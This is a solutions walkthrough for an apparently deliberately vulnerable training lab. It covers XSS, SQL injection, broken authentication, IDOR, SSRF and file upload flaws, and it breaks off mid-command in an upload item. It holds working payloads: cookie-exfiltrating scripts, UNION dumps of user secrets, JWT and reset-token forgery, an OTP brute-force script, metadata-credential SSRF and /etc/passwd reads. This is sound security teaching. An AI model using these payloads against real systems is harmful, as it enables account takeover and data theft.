# PenTrix VulnLab – Solutions

Full walkthroughs for all 235 challenges. **Try each one yourself first** – the hints on each module page are there to nudge you, not to hand you the answer.

Base URL for every payload below: `http://localhost:3000`

---
---

## xss – Cross-Site Scripting

**1. Reflected XSS** – `PENTRIX{xss_reflected}`
The search box reflects your query into the page with no escaping:
```
GET /xss/search?q=<script>alert(1)</script>
```
Then prove it reached a victim by "sending" the cookie to the collector:
```
GET /xss/collect?c=abc&v=reflected
```
Why it works: untrusted input is concatenated straight into HTML. In the real world the attacker would mail this link to a victim.

**2. Stored XSS** – `PENTRIX{xss_stored}`
Post a comment containing a script; it is stored and rendered raw for every later visitor:
```
POST /xss/guestbook
author=you&body=<script>fetch('/xss/collect?c='+document.cookie+'&v=stored')</script>
```
Then:
```
GET /xss/collect?c=abc&v=stored
```
Why it works: the guestbook saves HTML verbatim and serves it back unsanitized. Stored XSS is worse than reflected because the victim only has to view the page.

**3. DOM XSS** – `PENTRIX{xss_dom}`
The `/xss/dom` demo page drops attacker-controlled data into the DOM with a dangerous sink (`innerHTML`). Feed it a payload, then:
```
GET /xss/collect?c=abc&v=dom
```
Why it works: the injection happens entirely in the browser – the server never sees the payload, so server-side filters cannot help.

---

**4. Stored XSS in Profile Bio** – `PENTRIX{xss_stored-xss-profile}`
1. Open `/xss/profile`.
2. Paste this as your bio and save:
   `<script>fetch('/xss/collect?c='+document.cookie+'&v=stored-xss-profile')</script>`
3. Reload `/xss/profile`. Your browser fires the beacon to `/xss/collect` and the flag is awarded.
Why it works: the bio is stored verbatim in the `xss_profiles` table and rendered raw on the profile page with no output encoding, so the script runs for every visitor.

**5. XSS via Attribute Breakout** – `PENTRIX{xss_xss-attr-breakout}`
1. Open `/xss/attr?n="><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-attr-breakout')</script>`
2. The page renders `<input type="text" value=""><script>...</script>" readonly />` and the script executes, firing the beacon.
Why it works: the nickname is interpolated raw inside `value="..."`, so `">` closes the attribute and the injected `<script>` tag runs.

**6. XSS in a JavaScript String** – `PENTRIX{xss_xss-js-context}`
1. Open `/xss/jsctx?q=';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context');//` (URL-encoded).
2. The page renders `var q = '';fetch('...');//';` and the fetch executes, firing the beacon.
Why it works: input is reflected raw inside a single-quoted JS string; the leading `'` ends the string, the attacker's statement runs, and `//` comments out the trailing quote.

**7. Stored XSS via SVG Upload** – `PENTRIX{xss_xss-svg-upload}`
1. Open `/xss/svg` and upload this SVG:
   `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload')</script></svg>`
2. Open the uploaded file's link (e.g. `/xss/uploads/evil-<timestamp>.svg`) directly. The script runs and the beacon awards the flag.
Why it works: the file is served back as `image/svg+xml`, and SVG is XML that may contain `<script>`; a direct visit executes it in the lab's origin.

**8. XSS via Naive Markdown Links** – `PENTRIX{xss_xss-markdown}`
1. Open `/xss/markdown` and render:
   `[click](javascript:fetch&#40;'/xss/collect?c='+document.cookie+'&v=xss-markdown'&#41;)`
   (the `&#40;`/`&#41;` entities keep the renderer's `[^)]+` link regex from cutting the URL short; the browser decodes them in the `href`).
2. The output contains `<a href="javascript:...">click</a>`. Click it: the script runs and the beacon awards the flag.
Why it works: the naive renderer converts `[text](url)` to an anchor without validating the URL scheme, so `javascript:` URLs survive into a live link.

**9. DOM Clobbering to Admin** – `PENTRIX{xss_xss-dom-clobber}`
1. Open `/xss/clobber` and save this custom HTML:
   `<form id="settings"><input name="isAdmin" value="1">`
   (The sanitizer strips `<script>` blocks but allows `form`/`input`.)
2. Reload `/xss/clobber`: the page script sees `window.settings.isAdmin` (the form is exposed as `window.settings`, its named input as `.isAdmin`) and reveals the admin panel.
3. Open `/xss/clobber-admin` to claim the flag.
Why it works: named DOM elements shadow `window` properties, so attacker markup creates the `window.settings` object the page script trusts, flipping the `isAdmin` check without any script tag.

**10. DOM XSS via document.write** – `PENTRIX{xss_xss-hash-write}`
1. Open `/xss/hashwrite#<script>fetch('/xss/collect?c='+document.cookie+'&v=xss-hash-write')</script>` (URL-encode the fragment).
2. The page runs `document.write(location.hash.slice(1))`, the injected script executes, and the beacon awards the flag.
Why it works: the fragment flows unsanitized into `document.write`, a sink distinct from the `innerHTML` lab; content written this way is parsed as HTML, so script tags execute.

**11. XSS in a Template Literal** – `PENTRIX{xss_xss-backtick}`
1. Open `/xss/backtick?m=${fetch('/xss/collect?c='+document.cookie+'&v=xss-backtick')}` (URL-encoded).
2. The page renders `` var msg = `${fetch('...')}`; `` and the expression evaluates, firing the beacon.
Why it works: input is reflected raw inside a backtick template literal, and `${...}` expressions inside template literals are evaluated as JavaScript.
---

## sqli – SQL Injection

**1. Login bypass** – `PENTRIX{sqli_login-bypass}`
The login query interpolates your username into SQL. Break out of the string and make the WHERE clause always true:
```
POST /sqli/login
username=admin' OR '1'='1&password=anything
```
Why it works: the query becomes `... WHERE username='admin' OR '1'='1' ...`, which matches the admin row without a password.

**2. UNION injection** – `PENTRIX{sqli_union}`
The product search concatenates `q` into the query. Append a UNION SELECT with matching column count:
```
GET /sqli/products?q=' UNION SELECT id,username,password,secret FROM users--%20
```
Why it works: UNION merges rows from another table into the result set, so the page renders usernames, password hashes, and secrets as "products".

**3. Blind boolean injection** – `PENTRIX{sqli_blind}`
`/sqli/product?id=` only answers "exists / not found", but you can ask it yes/no questions about the secret:
```
GET /sqli/product?id=1 AND substr((SELECT secret FROM users WHERE username='admin'),1,1)='P'
```
Repeat per character, then submit what you extracted:
```
POST /sqli/blind-submit
secret=<the secret you extracted>
```
Why it works: even a single bit of difference in the response is enough to exfiltrate data one boolean question at a time.

**4. Error-based injection** – `PENTRIX{sqli_error}`
Raw SQLite errors are printed to the page. Any malformed input proves the injection point:
```
GET /sqli/detail?id='
```
Why it works: verbose database errors confirm your input reached the SQL parser and leak schema details for free.

---

**5. ORDER BY Injection** – `PENTRIX{sqli_order-by}`

The `sort` parameter on `/sqli/sort` is interpolated straight into `ORDER BY`,
and `ORDER BY` accepts full expressions, not just column names. Smuggle in a
`CASE WHEN` boolean oracle that reads the users table:

```bash
curl -G 'http://localhost:3000/sqli/sort' \
  --data-urlencode "sort=(CASE WHEN (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' THEN name ELSE price END)"
```

Watch the row order: when the condition is true the table is sorted by name
(Bug Bounty Field Notes first); flip `'P'` to a wrong guess like `'X'` and the
table is sorted by price instead (Sticker Pack first). Each request answers one
yes/no question about the secret. The flag is awarded when the CASE-based oracle
against the users table runs successfully.

Why it works: `ORDER BY` evaluates any expression per row, so a conditional
expression turns the visible sort order into a boolean oracle.

**6. Second-Order SQL Injection** – `PENTRIX{sqli_second-order}`

Registration (`POST /sqli/register`) stores your display name with a prepared
statement, so the payload sleeps quietly. But `/sqli/profile` later interpolates
that stored value into a brand-new query:

```bash
# Step 1: plant the payload as your display name
curl -X POST 'http://localhost:3000/sqli/register' \
  --data-urlencode 'username=evil1' \
  --data-urlencode "display_name=admin'--" \
  --data-urlencode 'password=x'

# Step 2: trigger it by viewing your profile
curl 'http://localhost:3000/sqli/profile?u=evil1'
```

The profile page runs `SELECT * FROM users WHERE username='admin'--'` and lands
on the admin account, displaying its secret and awarding the flag. The injection
fires on read, not on write.

Why it works: input that is safe at rest becomes SQL when it is concatenated
into a later query; the trust boundary moved from the form to the database.

**7. LIKE Wildcard Injection** – `PENTRIX{sqli_like-wildcard}`

`/sqli/wildcard` drops your term into `LIKE '%q%'` without escaping the pattern
characters `%` and `_`:

```bash
curl -G 'http://localhost:3000/sqli/wildcard' --data-urlencode 'q=%'
```

A single `%` matches everything, so one request dumps the whole catalog. `_`
works the same way for single characters (try `q=B_g` to see partial matching).

Why it works: `%` and `_` are wildcards inside `LIKE`, and the app never escapes
them, so attacker-controlled wildcards widen the match to rows the search
should not return.

**8. LIMIT/OFFSET Injection** – `PENTRIX{sqli_limit-offset}`

`/sqli/paged` shows 2 products, but `limit` is interpolated raw into the `LIMIT`
clause, and `LIMIT` accepts more than a plain number:

```bash
curl 'http://localhost:3000/sqli/paged?limit=-1'   # SQLite: -1 means no limit
curl 'http://localhost:3000/sqli/paged?limit=1,10'  # offset,count form
```

Both dump every product instead of the default page of 2, and the flag is
awarded for genuine LIMIT-syntax injection (a plain number like `limit=10`
dumps rows too, but earns nothing).

Why it works: the numeric context was never validated, so SQL clause syntax
(`-1`, `offset,count`) is accepted where only a page size was intended.

**9. GROUP BY Injection** – `PENTRIX{sqli_groupby-having}`

`/sqli/stats` groups sales by the `by` parameter and prints the grouping key in
the first column. `GROUP BY` accepts any expression, including a subquery:

```bash
curl -G 'http://localhost:3000/sqli/stats' \
  --data-urlencode "by=(SELECT secret FROM users WHERE username='admin')"
```

Every row collapses into one group whose key is the admin secret, which renders
in the Group column and triggers the flag.

Why it works: the grouping expression is attacker-controlled and echoed back,
so pointing it at the users table exfiltrates data through the group key.

**10. UNION Filter Bypass** – `PENTRIX{sqli_union-filter-bypass}`

`/sqli/shop` strips only the exact lowercase word `union` from your search. The
filter is case-sensitive and comment-blind:

```bash
curl -G 'http://localhost:3000/sqli/shop' \
  --data-urlencode "q=' UNION SELECT id,username,password,secret FROM users-- "
```

Uppercase `UNION` sails through and dumps the users table, including the admin
secret. Variants that also work: mixed case (`uNiOn`) and inline comments
(`'/**/UNION/**/SELECT`). Lowercase `union` gets mangled into a database error,
which is the filter "working".

Why it works: blacklist filters that do not understand SQL case-insensitivity
or comment syntax are trivially bypassed with equivalent spellings.

**11. INSERT Injection** – `PENTRIX{sqli_insert-inject}`

The feedback form at `/sqli/feedback` interpolates your input into
`INSERT INTO sqli_feedback(name, message) VALUES ('...', '...')`. Stacked
queries are blocked, but `VALUES()` accepts a subquery as a value:

```bash
curl -X POST 'http://localhost:3000/sqli/feedback' \
  --data-urlencode "name=x', (SELECT secret FROM users WHERE username='admin')) -- " \
  --data-urlencode 'message=hello'
curl 'http://localhost:3000/sqli/feedback'
```

The resulting SQL is
`VALUES ('x', (SELECT secret FROM users WHERE username='admin')) -- ', 'hello')`,
so your feedback row's message becomes the admin secret. Viewing the feedback
wall awards the flag.

Why it works: breaking out of the VALUES list lets a scalar subquery supply a
column value, turning an INSERT into a read primitive.

**12. Error-based Injection (Runtime Errors)** – `PENTRIX{sqli_error-cast}`

`/sqli/cast` leaks raw database errors like the syntax-error lab, but a plain
stray quote earns nothing here. Trigger a *runtime* error instead:

```bash
# malformed JSON inside a function call
curl -G 'http://localhost:3000/sqli/cast' \
  --data-urlencode "id=json_extract('{{{','\$.a')"

# alternative: reference a column that does not exist
curl -G 'http://localhost:3000/sqli/cast' --data-urlencode 'id=nosuchcol'
```

The page shows `SQL error: malformed JSON` (or `no such column`) and awards the
flag. Because `CASE WHEN` short-circuits, this oracle extends to full boolean
extraction, e.g.
`id=1 AND (SELECT CASE WHEN (substr((SELECT secret FROM users WHERE username='admin'),1,1)='P') THEN json_extract('{{{','$.a') ELSE 1 END)`.

Why it works: SQLite distinguishes parse-time syntax errors from runtime
failures, and runtime errors (bad function input, missing columns) make a
separate, equally usable oracle.

---
---

## auth – Broken Authentication

**1. No rate limiting** – `PENTRIX{auth_brute-force}`
Log in wrongly 5 or more times in the same session, then log in correctly as alice (`alice123`). Nothing stops you from guessing forever.
Why it works: no throttling, no lockout, no CAPTCHA. Weak passwords fall to simple scripting.

**2. JWT `alg=none`** – `PENTRIX{auth_jwt-none}`
The `/auth/jwt-admin` verifier trusts tokens whose header says `{"alg":"none"}` without checking any signature. Mint your own:
```python
import base64, json
enc = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
token = enc({"alg":"none","typ":"JWT"}) + "." + enc({"user":"alice","role":"admin"}) + "."
```
```
GET /auth/jwt-admin  with header  Authorization: Bearer <token>
```
Why it works: the code branches around signature verification for `alg=none` and then trusts the self-declared `role` claim.

**3. Password reset forgery** – `PENTRIX{auth_reset}`
Reset tokens are just base64 of the username with no randomness and no server-side record. Forge one for admin:
```
POST /auth/reset/confirm
token=YWRtaW4=&newPassword=hacked123
```
(`YWRtaW4=` is base64 of `admin`.) The flag fires because that token was never legitimately issued in your session.
Why it works: predictable, unguessable-looking tokens are still predictable. Reset tokens must be random and single-use.

---

**4. Username Enumeration** – `PENTRIX{auth_user-enum}`

1. Open `GET /auth/enum-login`.
2. Submit a bogus name:
   `curl --data-urlencode "username=nosuchuser" --data-urlencode "password=x" http://localhost:3000/auth/enum-login`
   Response: "User nosuchuser not found."
3. Submit a real name with a wrong password (keep the same cookie jar so the
   session persists):
   `curl -c jar -b jar --data-urlencode "username=alice" --data-urlencode "password=wrongpw" http://localhost:3000/auth/enum-login`
   Response: "Wrong password for user alice." The different message confirms
   the username exists.
4. Submit the confirmed name:
   `curl -c jar -b jar --data-urlencode "username=alice" http://localhost:3000/auth/enum-submit`
   The flag is awarded.

Why it works: the login distinguishes "user not found" from "wrong password",
so each probe leaks whether a username exists; the submit page awards the flag
once a name confirmed through that oracle is submitted.

**5. Unsigned Remember-Me Cookie** – `PENTRIX{auth_rememberme}`

1. Log in as bob with "remember me" ticked:
   `curl -c jar --data-urlencode "username=bob" --data-urlencode "password=bob123" --data-urlencode "remember=1" http://localhost:3000/auth/remember-login`
   The response shows `remember_me=Ym9i`, which is base64("bob").
2. Forge the cookie for admin: base64("admin") = `YWRtaW4=`.
3. In a fresh session, present the forged cookie:
   `curl --cookie "remember_me=YWRtaW4=" http://localhost:3000/auth/remember`
   You are logged in as admin and the flag is awarded.

Why it works: the remember-me token is just base64(username) with no
signature or MAC, so anyone can mint a valid token for any user.

**6. Brute-Forcing a 4-Digit OTP** – `PENTRIX{auth_otp-bruteforce}`

1. `curl -c jar -b jar http://localhost:3000/auth/otp-reset` and copy the
   reset token from the page (the scenario hands you a valid token for admin).
2. Brute-force all 10,000 codes against the verify endpoint (no rate limiting).
   Example script:
   ```python
   import re, requests
   s = requests.Session()
   token = re.search(r'<pre class="token">([0-9a-f]+)</pre>',
                     s.get('http://localhost:3000/auth/otp-reset').text).group(1)
   for i in range(10000):
       r = s.post('http://localhost:3000/auth/otp-reset/verify',
                  data={'token': token, 'otp': '%04d' % i, 'newPassword': 'otpwned1'})
       if 'PENTRIX{auth_otp-bruteforce}' in r.text:
           print('found:', '%04d' % i); break
   ```
3. The correct code resets admin's password and awards the flag; log in at
   `/auth/login` with the new password to confirm.

Why it works: a 4-digit code with no rate limiting, no lockout, and no expiry
is enumerable in seconds, and the token alone was never meant to be secret.

**7. SHA-256 Predictable Reset Token** – `PENTRIX{auth_reset-predictable}`

1. Read the recipe shown on `GET /auth/sha-reset`:
   `sha256(username + 'reset-salt')`.
2. Forge admin's token locally, never requesting an admin reset:
   `node -e "console.log(require('crypto').createHash('sha256').update('admin'+'reset-salt').digest('hex'))"`
3. Confirm the forged token with a new password:
   `curl --data-urlencode "token=<forged>" --data-urlencode "newPassword=forged1" http://localhost:3000/auth/sha-reset/confirm`
   Admin's password changes and the flag is awarded.

Why it works: the token is a deterministic hash of public data, so anyone who
knows the recipe can mint a valid token for any account.

**8. Guessable Security Question** – `PENTRIX{auth_security-question}`

1. Open `GET /auth/bio/alice`. The bio says her mother's maiden name is Smith.
2. Reset her password with that answer:
   `curl --data-urlencode "username=alice" --data-urlencode "answer=Smith" --data-urlencode "newPassword=qwned1" http://localhost:3000/auth/question-reset`
   The flag is awarded; the new password works at `/auth/login`.

Why it works: the "secret" answer is public knowledge printed in the user's
bio, so the security question is not authentication at all.

**9. Password Change Without Current Password** – `PENTRIX{auth_change-pass-noverify}`

1. Log in as anyone: `curl -c jar -b jar --data-urlencode "username=bob" --data-urlencode "password=bob123" http://localhost:3000/auth/login`
2. Open `GET /auth/change-password` and note the form has no current-password field.
3. `curl -c jar -b jar --data-urlencode "newPassword=changed1" http://localhost:3000/auth/change-password`
   The password changes and the flag is awarded; log in with the new password
   to confirm.

Why it works: the endpoint trusts the session alone and never re-verifies
identity with the current password, so any active session can take over.

**10. Support Ticket Impersonation** – `PENTRIX{auth_support-impersonate}`

1. Open `GET /auth/support`. Tickets are sequential.
2. Walk the range: `curl "http://localhost:3000/auth/support/login?ticket=1001"`
   through `1005`. Ticket 1004 logs you in as bob; ticket 1005 logs you in as
   admin and awards the flag.

Why it works: ticket ids are predictable and the support endpoint performs no
authorization check, so anyone can impersonate any customer, including admin.

**11. API Key Leaked in HTML Comment** – `PENTRIX{auth_apikey-leak}`

1. Log in as anyone and open `GET /auth/settings` (keep the session cookie).
2. View the page source: an HTML comment contains the admin API key, e.g.
   `<!-- DEBUG leftover from development: admin api key = px_admin_9f8e7d6c5b4a3f21e0d7c6b5 (remove before prod) -->`.
3. Call the admin-only endpoint with it:
   `curl "http://localhost:3000/auth/api/admin/stats?api_key=px_admin_9f8e7d6c5b4a3f21e0d7c6b5"`
   The stats page renders and the flag is awarded (a wrong key gets 401).

Why it works: the only gate on the admin API is a static key, and a developer
left that key in an HTML comment readable via "view source".
---

## idor – Broken Access Control

Log in as alice first: `GET /idor/login/alice` (password `alice123`).

**1. Profile IDOR** – `PENTRIX{idor_profile}`
```
GET /idor/users/1
```
You are user 2, but nothing stops you reading user 1 (admin).

**2. Order IDOR** – `PENTRIX{idor_order}`
```
GET /idor/orders/2
```
Order 2 belongs to bob. The endpoint checks you are logged in, not that the order is yours.

**3. Unprotected admin panel** – `PENTRIX{idor_admin}`
```
GET /idor/admin
```
The panel only checks for *a* session, never for the *admin role*. Any logged-in user sees every user and order.
Why all three work: the app confuses authentication (who you are) with authorization (what you may do).

---

**4. Invoice Download IDOR** – `PENTRIX{idor_idor-download}`

1. Log in as alice.
2. `curl -c jar -b jar http://localhost:3000/idor/invoice/2` (bob's invoice)
   or `/idor/invoice/3` (admin's). The other user's invoice renders and the
   flag is awarded. Your own (`/idor/invoice/1`) gives no flag.

Why it works: the invoice is fetched by id with no ownership check.

**5. Email Change IDOR** – `PENTRIX{idor_idor-email-change}`

1. Log in as alice and open `GET /idor/account` to see the change-email form.
2. Tamper the `user_id` field to target admin (id 1):
   `curl -c jar -b jar --data-urlencode "user_id=1" --data-urlencode "email=pwned@evil.lab" http://localhost:3000/idor/account/email`
   Admin's email is overwritten and the flag is awarded.

Why it works: the target account comes from a client-supplied `user_id`
parameter that the server never validates against the logged-in user.

**6. Shopping Cart IDOR** – `PENTRIX{idor_idor-cart}`

1. Log in as alice.
2. `curl -c jar -b jar "http://localhost:3000/idor/cart?user_id=3"` (bob's cart)
   or `?user_id=1` (admin's). The other user's cart renders and the flag is
   awarded.

Why it works: the cart is looked up by a client-supplied `user_id` query
parameter with no ownership check.

**7. API Key Regeneration IDOR** – `PENTRIX{idor_idor-apikey-regen}`

1. Log in as alice and open `GET /idor/apikey`.
2. Regenerate admin's key (id 1) instead of your own:
   `curl -c jar -b jar --data-urlencode "user_id=1" http://localhost:3000/idor/apikey/regen`
   The page shows the fresh key, e.g. `idor_d698ad906655d4006c633bae`.
3. Authenticate with it:
   `curl -c jar -b jar "http://localhost:3000/idor/apikey/use?key=idor_d698ad906655d4006c633bae"`
   The page confirms the key belongs to admin and the flag is awarded.

Why it works: key regeneration trusts a client-supplied `user_id` with no
ownership check, so you can rotate anyone's key and then use the new value.

**8. Stored Address IDOR** – `PENTRIX{idor_idor-address}`

1. Log in as alice.
2. `curl -c jar -b jar http://localhost:3000/idor/address/3` (admin's address)
   or `/idor/address/2` (bob's). The other user's address renders and the
   flag is awarded.

Why it works: the stored address is fetched by id with no ownership check.

**9. Forced Browsing to Admin Function** – `PENTRIX{idor_function-browse}`

1. Log in as alice (or bob), a non-admin user.
2. `curl -c jar -b jar http://localhost:3000/idor/admin/users`
   The full user list renders and the flag is awarded. The page is not linked
   anywhere for normal users, but nothing stops you from typing the URL.

Why it works: the endpoint only checks "logged in" and never the admin role,
so any authenticated user can force-browse the admin function.

**10. Comment Deletion IDOR** – `PENTRIX{idor_idor-comment-delete}`

1. Log in as bob and open `GET /idor/comments` to see comment ids.
2. Delete a comment written by someone else (admin's is id 1):
   `curl -c jar -b jar --data-urlencode "id=1" http://localhost:3000/idor/comments/delete`
   The comment is deleted and the flag is awarded.

Why it works: deletion is keyed by comment id only; authorship is never
checked.

**11. Private Notes IDOR** – `PENTRIX{idor_idor-notes}`

1. Log in as alice.
2. `curl -c jar -b jar http://localhost:3000/idor/notes/3` (admin's private
   note, containing the vault code) or `/idor/notes/2` (bob's). The other
   user's note renders and the flag is awarded.

Why it works: private notes are retrieved by numeric id with no ownership
check.
---

## ssrf – Server-Side Request Forgery

**1. Basic SSRF** – `PENTRIX{ssrf_basic}`
The fetcher requests any URL you give it, including internal ones:
```
GET /ssrf/fetch?url=http://localhost:3000/ssrf/internal/secret
```
Why it works: user input becomes the server's outbound request target, so you can make the server talk to itself.

**2. Blocklist bypass** – `PENTRIX{ssrf_bypass}`
`/ssrf/fetch2` blocks URLs containing the *strings* `127.0.0.1` or `localhost`. The same address has other spellings:
```
GET /ssrf/fetch2?url=http://2130706433:3000/ssrf/internal/secret
```
(`2130706433` is the decimal form of `127.0.0.1`.)
Why it works: string blocklists are not address validation. Parse the URL, resolve the host, then decide.

---

**3. Open-redirect SSRF** – `PENTRIX{ssrf_ssrf-redirect}`

`/ssrf/fetch3` follows redirects (up to 5) but only inspects the *initial*
URL's hostname against its blocklist (`127.0.0.1`). Bounce the fetch through
the open redirect at `/ssrf/jump`, whose `to` parameter goes anywhere,
including the blocked internal host:

```bash
curl --get --data-urlencode \
  "url=http://localhost:3000/ssrf/jump?to=http://127.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/fetch3
```

The response contains the internal secret marker `SSRF-INTERNAL-9921` and the
flag `PENTRIX{ssrf_ssrf-redirect}`. The page awards the flag only when at
least one redirect was actually followed, so a direct fetch of the secret
through `/ssrf/fetch3` shows the marker but earns no flag. Fetching
`http://127.0.0.1:3000/...` directly still returns 403.

Why it works: the blocklist is checked against the first URL only and the
redirect target is never re-validated, so the 302 response from `/ssrf/jump`
smuggles the server-side request to the blocked host.

**4. Userinfo bypass** – `PENTRIX{ssrf_ssrf-userinfo}`

`/ssrf/userinfo` "allows" only URLs containing the string `pentrix.lab`.
Smuggle the trusted string in as userinfo (everything before `@` is
credentials, not the host):

```bash
curl --get --data-urlencode \
  "url=http://pentrix.lab@127.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/userinfo
```

The check sees `pentrix.lab` and passes, but the request really goes to
`127.0.0.1:3000`, returning the secret marker and the flag
`PENTRIX{ssrf_ssrf-userinfo}`.

Why it works: the allowlist is a raw substring test instead of parsing the
real hostname, so userinfo positioning tricks it while the URL parser routes
to loopback.

**5. Hex IP bypass** – `PENTRIX{ssrf_ssrf-hex-ip}`

`/ssrf/hex-ip` blocks the literal strings `127.0.0.1` and `localhost` in the
raw URL. Use hex octets, which the WHATWG URL parser normalizes to 127.0.0.1:

```bash
curl --get --data-urlencode \
  "url=http://0x7f.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/hex-ip
```

The string `0x7f.0.0.1` contains no blocked substring, yet the fetcher
connects to loopback and returns the secret marker plus the flag
`PENTRIX{ssrf_ssrf-hex-ip}`.

Why it works: the blocklist compares raw strings while the URL parser
normalizes alternate IP spellings, so the normalized request and the
blocklisted string never match.

**6. Octal IP bypass** – `PENTRIX{ssrf_ssrf-octal-ip}`

Same naive blocklist on `/ssrf/octal-ip`. Leading zeros make the parser read
octets as octal (`0177` = 127):

```bash
curl --get --data-urlencode \
  "url=http://0177.0.0.1:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/octal-ip
```

No blocked substring is present, the request lands on loopback, and the page
returns the secret marker with the flag `PENTRIX{ssrf_ssrf-octal-ip}`.

Why it works: the blocklist only knows dotted decimal, but the URL parser
interprets zero-padded parts as octal, resolving `0177.0.0.1` to 127.0.0.1.

**7. 0.0.0.0 bypass** – `PENTRIX{ssrf_ssrf-zero-ip}`

`/ssrf/zero-ip` never mentions `0.0.0.0` in its blocklist, and this fetcher
treats it as "this host":

```bash
curl --get --data-urlencode \
  "url=http://0.0.0.0:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/zero-ip
```

The fetch succeeds against loopback and the flag `PENTRIX{ssrf_ssrf-zero-ip}`
is awarded.

Why it works: `0.0.0.0` is a loopback-adjacent address the blocklist simply
never considered, and the fetcher rewrites it to 127.0.0.1 the way several
real HTTP stacks do.

**8. Integer IP bypass** – `PENTRIX{ssrf_ssrf-single-int}`

An IPv4 address is one 32-bit number; 127.0.0.1 = 2130706433. `/ssrf/single-int`
has the same substring blocklist:

```bash
curl --get --data-urlencode \
  "url=http://2130706433:3000/ssrf/internal/secret" \
  http://localhost:3000/ssrf/single-int
```

The decimal form contains no blocked string, resolves to loopback, and the
response carries the secret marker with the flag
`PENTRIX{ssrf_ssrf-single-int}`.

Why it works: the URL parser accepts the single-integer IPv4 form and
normalizes it to 127.0.0.1, while the blocklist only recognizes the dotted
spelling.

**9. Cloud metadata SSRF** – `PENTRIX{ssrf_ssrf-metadata}`

`/ssrf/fetch-meta` simulates a cloud instance metadata service at the
link-local address 169.254.169.254, which nothing blocks:

```bash
curl --get --data-urlencode \
  "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  http://localhost:3000/ssrf/fetch-meta
```

The simulated metadata document (including fake IAM credentials whose secret
access key embeds the marker `SSRF-INTERNAL-9921`) is returned and the flag
`PENTRIX{ssrf_ssrf-metadata}` is awarded.

Why it works: the fetcher does not restrict destination addresses, so the
classic cloud metadata endpoint is reachable server-side and leaks instance
credentials.

**10. file:// scheme SSRF** – `PENTRIX{ssrf_ssrf-file}`

`/ssrf/fetch-file` accepts the `file:` scheme and reads the path with the
server's filesystem privileges:

```bash
curl --get --data-urlencode "url=file:///etc/passwd" \
  http://localhost:3000/ssrf/fetch-file
```

The page shows the contents of `/etc/passwd` (look for the `root:` line) and
awards the flag `PENTRIX{ssrf_ssrf-file}`.

Why it works: allowing `file://` in a URL fetcher turns it into a local file
reader running with the server's privileges.

---
---

## upload – Unrestricted File Upload

**1. Stored XSS via upload** – `PENTRIX{upload_stored-xss}`
No content checks at all, and files are served inline, so an uploaded SVG executes in the browser:
```
curl --data-binary @evil.svg "http://localhost:3000/upload?filename=evil.svg"
```
Why it works: the server never asks *what* the file is, and serving HTML/SVG inline turns storage into script execution.

**2. Blacklist bypass** – `PENTRIX{upload_blacklist-bypass}`
v2 blocks only the *exact* lowercased extensions `.php`, `.exe`, `.sh`. Smuggle the dangerous extension inside a longer name:
```
curl --data-binary @shell.php.jpg "http://localhost:3000/upload/blacklist?filename=shell.php.jpg"
```
Why it works: the check looks at the final extension only (`.jpg`), while the stored filename still contains `.php`. Blacklists enumerate badness; allowlists enumerate goodness.

---

**3. Double extension bypass** – `PENTRIX{upload_upload-double-ext}`

`/upload/ext-blacklist` blocks `.svg`/`.html`/`.htm` by exact, case-sensitive
*final* extension only, while `/upload/view/:name` guesses the served content
type from a substring of the filename. Upload a file with a harmless final
extension but a dangerous middle one:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://localhost:3000/upload/ext-blacklist?filename=shell.svg.jpg"
```

The response contains the flag `PENTRIX{upload_upload-double-ext}`. Verify it
is served as active content:

```bash
curl -sI http://localhost:3000/upload/view/shell.svg.jpg   # Content-Type: image/svg+xml
curl -s  http://localhost:3000/upload/view/shell.svg.jpg   # payload intact
```

Why it works: `path.extname("shell.svg.jpg")` is `.jpg`, so the blacklist
misses it, but the viewer's substring check finds `.svg` and serves the file
as SVG, so embedded scripts execute in a victim's browser.

**4. Case-sensitive blacklist bypass** – `PENTRIX{upload_upload-case}`

The same v3 blacklist compares the extension exactly as written, without
lowercasing:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://localhost:3000/upload/ext-blacklist?filename=evil.SVG"
```

`evil.SVG` dodges the lowercase `.svg` entry and the flag
`PENTRIX{upload_upload-case}` is awarded. Fetching
`/upload/view/evil.SVG` shows it served as `image/svg+xml` with the payload
intact.

Why it works: the blacklist does a case-sensitive string comparison, but the
viewer lowercases before guessing the content type, so the uppercase variant
is stored yet still served as active SVG.

**5. Content-Type header spoofing** – `PENTRIX{upload_upload-ctype}`

`/upload/mime-check` decides "is this an image" from the client-supplied
`Content-Type` request header alone, never inspecting the bytes:

```bash
printf '<html><body><script>alert(1)</script></body></html>' \
  | curl -H "Content-Type: image/png" --data-binary @- \
    "http://localhost:3000/upload/mime-check?filename=evil.html"
```

The HTML file is accepted and the flag `PENTRIX{upload_upload-ctype}` is
awarded. `/upload/view/evil.html` returns it as `text/html`.

Why it works: the header is fully attacker-controlled, so lying about the
content type sails past a check that never looks at the actual file bytes.

**6. Path traversal on write** – `PENTRIX{upload_upload-traversal}`

`/upload/traverse` joins the raw filename to the uploads directory with no
basename or containment check. Escape the directory with `../`:

```bash
printf 'TRAVERSAL-PROOF' \
  | curl --data-binary @- "http://localhost:3000/upload/traverse?filename=../pwn.txt"
```

The file lands one level above the uploads dir and the flag
`PENTRIX{upload_upload-traversal}` is awarded. Read it back through the same
missing check on the read path:

```bash
curl "http://localhost:3000/upload/traversed?f=../pwn.txt"   # prints TRAVERSAL-PROOF
```

Why it works: `path.join` does not stop `../` segments from escaping the
intended directory, so both the write and the read resolve outside the
uploads folder.

**7. SVG onload stored XSS** – `PENTRIX{upload_upload-svg-onload}`

`/upload/svg-avatar` accepts `.svg` files and serves them inline without
stripping event-handler attributes:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="10" height="10"/></svg>' \
